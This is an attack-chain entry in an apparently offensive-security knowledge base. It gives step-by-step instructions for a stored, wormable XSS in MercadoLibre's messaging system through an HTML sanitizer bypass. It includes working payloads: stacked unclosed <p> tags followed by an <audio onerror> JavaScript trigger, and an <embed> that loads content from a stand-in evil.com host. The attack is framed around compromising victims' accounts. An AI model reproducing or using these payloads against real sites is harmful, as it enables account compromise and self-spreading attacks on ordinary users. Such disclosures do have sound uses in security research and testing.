---
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
tags:
  - xss
  - stored-xss
  - html-sanitizer-bypass
  - javascript-injection
  - wormable
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Analyze-HTML-Sanitizer-in-Messaging-Functionality]]'
  - '[[procedures/Discover-Sanitizer-Bypass-with-Unclosed-p-Tags]]'
  - '[[procedures/Craft-Payload-to-Inject-audio-Tag-for-JavaScript-Execution]]'
  - '[[procedures/Adjust-Payload-for-embed-Tag-to-Include-External-Content]]'
step_count: 4
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:55:20.937Z'
description: >-
  A multi-step attack exploiting a stored XSS vulnerability in MercadoLibre's
  messaging system by bypassing the HTML sanitizer using multiple unclosed <p>
  tags to inject arbitrary HTML and execute JavaScript, enabling wormable
  propagation across users.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Stored XSS in MercadoLibre Messaging via HTML Sanitizer Bypass

Multi-stage attack chain demonstrating exploitation of a stored XSS vulnerability in MercadoLibre's general messaging functionality on www.mercadolibre.com.ar. The attack bypasses the HTML sanitizer by leveraging multiple unclosed <p> tags to confuse the parser, allowing injection of arbitrary HTML tags like <audio> or <embed> that execute JavaScript in victims' browsers. This enables wormable XSS, where the payload spreads to other users via messaging, potentially compromising multiple accounts.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~30 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Analyze Sanitizer] --> B[Discover Bypass] --> C[Craft Audio Payload] --> D[Adjust Embed Payload]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Browser developer tools for inspection
- Access to a MercadoLibre account for testing messaging

### Target Environment

- Web platform
- Messaging functionality on www.mercadolibre.com.ar
- HTML-based input fields in messages

### Initial Access Requirements

- Valid user account on MercadoLibre
- Ability to send messages to other users
- No special privileges needed beyond standard user access

## Detailed Attack Procedures

### Step 1: Analyze HTML Sanitizer
procedure: [[procedures/Analyze-HTML-Sanitizer-in-Messaging-Functionality]]

**Objective**: Understand the sanitizer's tag restrictions to identify potential bypass opportunities.

**Instructions**: Inspect the messaging input field using browser developer tools. Submit test payloads with common HTML tags like <script> and observe how they are sanitized. Note that only a limited set of tags, such as <p>, are allowed, while dangerous tags are stripped.

**Expected Output**: Confirmation that the sanitizer permits <p> tags but blocks <script>, <audio>, etc.

**Success Indicators**:
- Sanitizer behavior documented
- Allowed tag list identified

### Step 2: Discover Bypass Technique
procedure: [[procedures/Discover-Sanitizer-Bypass-with-Unclosed-p-Tags]]

**Objective**: Identify a parser confusion vulnerability using unclosed tags.

**Instructions**: Experiment with payloads containing multiple unclosed <p> tags, such as <p><p><p><p><p><p><p><p>. Send these via the messaging system and inspect the rendered output in the recipient's view. Observe that the excess unclosed tags disrupt the parser, potentially allowing additional tags to slip through.

**Expected Output**: Rendered message shows unexpected parsing behavior, with extra content not fully sanitized.

**Success Indicators**:
- Parser confusion confirmed
- Ability to append unauthorized tags noted

### Step 3: Craft and Inject Audio Payload
procedure: [[procedures/Craft-Payload-to-Inject-audio-Tag-for-JavaScript-Execution]]

**Objective**: Bypass restrictions to inject an <audio> tag that executes JavaScript via an onerror event.

**Instructions**: Construct a payload with eight unclosed <p> tags followed by <audio src/onerror=alert(document.domain)>. Send this as a message and view it in another account or incognito session to trigger execution.

**Expected Output**: Alert box displaying the document domain in the victim's browser.

**Success Indicators**:
- JavaScript alert fires
- XSS confirmed as stored and executable

### Step 4: Enhance Payload for External Content
procedure: [[procedures/Adjust-Payload-for-embed-Tag-to-Include-External-Content]]

**Objective**: Scale the bypass to inject larger tags like <embed> for loading external malicious HTML/JavaScript.

**Instructions**: Increase the number of unclosed <p> tags (e.g., to 10 or more) based on the size of the <embed> tag. Craft payload like <p><p>... (multiple)<p><embed src="http://evil.com/malicious.html">. Send and verify execution loads external content.

**Expected Output**: External script or HTML loads and executes in the victim's context.

**Success Indicators**:
- External resource fetched
- Potential for data exfiltration or further exploitation

## Attack Chain Summary

### Key Achievements

1. Bypassed HTML sanitizer using parser confusion with unclosed <p> tags.
2. Injected executable HTML tags to run arbitrary JavaScript.
3. Demonstrated wormable potential through messaging propagation.
4. Enabled loading of external malicious content for advanced attacks.

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[JavaScript]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]

---

*Last updated: 2023-10-01T00:00:00Z*
